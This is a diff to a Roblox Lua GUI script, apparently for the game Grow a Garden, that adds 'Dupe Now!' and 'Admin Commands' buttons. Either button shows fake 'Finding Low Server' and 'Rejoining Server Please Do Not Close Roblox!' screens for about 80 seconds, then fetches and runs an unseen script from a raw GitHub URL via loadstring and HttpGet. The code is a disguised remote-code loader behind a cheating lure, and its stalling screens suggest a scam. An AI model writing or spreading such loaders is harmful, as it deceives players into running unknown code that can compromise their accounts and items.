@@ -6,66 +6,139 @@ screenGui.Name = "MyGui"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Create the Loading Screen
-local loadingScreen = Instance.new("Frame")
-loadingScreen.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
-loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
-loadingScreen.Parent = screenGui
-
--- Create a loading label
-local loadingLabel = Instance.new("TextLabel")
-loadingLabel.Size = UDim2.new(1, 0, 0.1, 0)
-loadingLabel.Position = UDim2.new(0, 0, 0.45, 0)
-loadingLabel.Text = "Loading..."
-loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingLabel.TextScaled = true
-loadingLabel.BackgroundTransparency = 1
-loadingLabel.Parent = loadingScreen
-
 -- Create the main GUI Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
 mainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
+mainFrame.BorderSizePixel = 0
 mainFrame.Parent = screenGui
 
--- Create the button
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(0.8, 0, 0.2, 0)
-button.Position = UDim2.new(0.1, 0, 0.4, 0)
-button.Text = "Dupe Now, Admin Commands"
-button.TextColor3 = Color3.fromRGB(0, 0, 0)
-button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-button.Parent = mainFrame
+-- Create the buttons
+local button1 = Instance.new("TextButton")
+button1.Size = UDim2.new(0.8, 0, 0.2, 0)
+button1.Position = UDim2.new(0.1, 0, 0.2, 0)
+button1.Text = "Dupe Now!"
+button1.TextColor3 = Color3.fromRGB(255, 255, 255)
+button1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+button1.BorderSizePixel = 0
+button1.Parent = mainFrame
 
--- Animation for the button
-button.MouseEnter:Connect(function()
-    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-end)
+local button2 = Instance.new("TextButton")
+button2.Size = UDim2.new(0.8, 0, 0.2, 0)
+button2.Position = UDim2.new(0.1, 0, 0.6, 0)
+button2.Text = "Admin Commands"
+button2.TextColor3 = Color3.fromRGB(255, 255, 255)
+button2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+button2.BorderSizePixel = 0
+button2.Parent = mainFrame
 
-button.MouseLeave:Connect(function()
-    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-end)
-
--- Button click event
-button.MouseButton1Click:Connect(function()
-    -- Close the GUI
-    screenGui:Destroy()
-    
-    -- Load the external script
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/main/gagscript.lua"))()
+-- Animation for buttons on hover
+local function animateButton(button)
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
     end)
 
-    if not success then
-        warn("Failed to execute script: " .. err)
-    end
-end)
-
--- Animation for loading screen
-for i = 1, 10 do
-    loadingLabel.TextTransparency = i * 0.1
-    wait(0.1)
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end)
 end
 
-loadingScreen:Destroy() -- Remove loading screen after animation
+animateButton(button1)
+animateButton(button2)
+
+-- Function to create the first loading screen
+local function createLoadingScreen1()
+    local loadingScreen1 = Instance.new("Frame")
+    loadingScreen1.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
+    loadingScreen1.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+    loadingScreen1.Parent = screenGui
+
+    -- Create a loading label
+    local loadingLabel1 = Instance.new("TextLabel")
+    loadingLabel1.Size = UDim2.new(1, 0, 0.1, 0)
+    loadingLabel1.Position = UDim2.new(0, 0, 0.45, 0)
+    loadingLabel1.Text = "Finding Low Server Please Wait."
+    loadingLabel1.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingLabel1.TextScaled = true
+    loadingLabel1.BackgroundTransparency = 1
+    loadingLabel1.Parent = loadingScreen1
+
+    -- Create a magnifying glass animation
+    local magnifyingGlass = Instance.new("ImageLabel")
+    magnifyingGlass.Size = UDim2.new(0.1, 0, 0.1, 0)
+    magnifyingGlass.Position = UDim2.new(0.5, -50, 0.5, -50)
+    magnifyingGlass.Image = "rbxassetid://123456789" -- Replace with your magnifying glass image ID
+    magnifyingGlass.BackgroundTransparency = 1
+    magnifyingGlass.Parent = loadingScreen1
+
+    -- Animate the magnifying glass
+    for i = 1, 40 do
+        magnifyingGlass.Position = UDim2.new(0.5 + math.sin(i) * 0.1, -50, 0.5, -50)
+        wait(1) -- Wait for 1 second for each frame of the animation
+    end
+
+    loadingScreen1:Destroy() -- Remove loading screen after animation
+end
+
+-- Function to create the second loading screen
+local function createLoadingScreen2()
+    local loadingScreen2 = Instance.new("Frame")
+    loadingScreen2.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
+    loadingScreen2.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+    loadingScreen2.Parent = screenGui
+
+    -- Create a loading label
+    local loadingLabel2 = Instance.new("TextLabel")
+    loadingLabel2.Size = UDim2.new(1, 0, 0.1, 0)
+    loadingLabel2.Position = UDim2.new(0, 0, 0.45, 0)
+    loadingLabel2.Text = "Rejoining Server Please Do Not Close Roblox!"
+    loadingLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingLabel2.TextScaled = true
+    loadingLabel2.BackgroundTransparency = 1
+    loadingLabel2.Parent = loadingScreen2
+
+    -- Create a loading animation
+    local loadingCircle = Instance.new("Frame")
+    loadingCircle.Size = UDim2.new(0.1, 0, 0.1, 0)
+    loadingCircle.Position = UDim2.new(0.5, -50, 0.5, -50)
+    loadingCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    loadingCircle.Parent = loadingScreen2
+
+    -- Animate the loading circle
+    for i = 1, 40 do
+        loadingCircle.Rotation = loadingCircle.Rotation + 9 -- Rotate 9 degrees each frame
+        wait(1) -- Wait for 1 second for each frame of the animation
+    end
+
+    loadingScreen2:Destroy() -- Remove loading screen after animation
+end
+
+-- Button click event
+local function onButtonClick(button)
+    button.MouseButton1Click:Connect(function()
+        -- Smooth animation for button click
+        button:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true, function()
+            button:Destroy() -- Remove the button after animation
+        end)
+
+        -- Create the first loading screen
+        createLoadingScreen1()
+
+        -- Create the second loading screen
+        createLoadingScreen2()
+
+        -- Load the external script
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
+        end)
+
+        if not success then
+            warn("Failed to execute script: " .. err)
+        end
+    end)
+end
+
+-- Connect button click events
+onButtonClick(button1)
+onButtonClick(button2)
